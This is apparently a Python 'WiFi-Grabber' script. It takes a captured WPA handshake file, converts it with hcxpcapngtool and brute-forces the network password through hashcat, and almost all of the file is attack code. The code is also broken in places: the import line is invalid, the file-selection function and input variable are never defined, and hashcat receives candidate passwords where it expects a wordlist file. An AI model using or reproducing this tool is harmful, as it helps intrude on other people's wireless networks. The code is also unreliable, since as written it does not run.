import os
import subprocess
import string
import itertools
import signal
from bruteforce_attack.py import *

# ASCII Art
ascii_art = """
   ██╗    ██╗██╗███████╗██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
   ██║    ██║██║██╔════╝██║    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
   ██║ █╗ ██║██║█████╗  ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
   ██║███╗██║██║██╔══╝  ██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
   ╚███╔███╔╝██║██║     ██║    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
"""

print(ascii_art)
print("          WiFi-Grabber Tool • © 2023 • 47lecoste • SITO MEME")
print("")
print("")
print("  _____________________________________________________________________________________________\n")
print("* If files you select aren't in the same directory of the script, please write their entire path.")
print("")
print("** Type ^C (CTRL + c) to stop the script, if you want to exit before the end of the operation.")
print("  _____________________________________________________________________________________________\n")
print("")
print("")

# Select input .pcap file
Selectfile()
# Convert the .pcap file into .hc22000
hc22000_file = "wpa_crack.hc22000"
subprocess.run(["hcxpcapngtool", "-o", hc22000_file, input_file])

print("  _____________________________________________________________________________________________\n")
print("  ---------------------------------------------------------------------------------------------\n")

charset = string.printable  # Define the character set to be used

def timeout_handler(signum, frame):
    raise TimeoutError("Timeout expired. Password not found.")

# Set the timeout to 120" = 2' (2 minutes is a very low time, and this is just for example) 
timeout = 120

# Set the manager of signals for SIGALRM (the alarm)
signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(timeout)

# Brute force attack
try:
    password_length = 1
    while True:
        for password in itertools.product(charset, repeat=password_length):
            password = ''.join(password)
            result = subprocess.run(["hashcat", "-m", "22000", hc22000_file, password], capture_output=True)
            if "Cracked" in result.stdout.decode():
                print(f"Password found: {password}")
                raise SystemExit(0)  # Terminate the script if the password is found
        password_length += 1
except TimeoutError as e:
    print(str(e))
finally:
    signal.alarm(0)
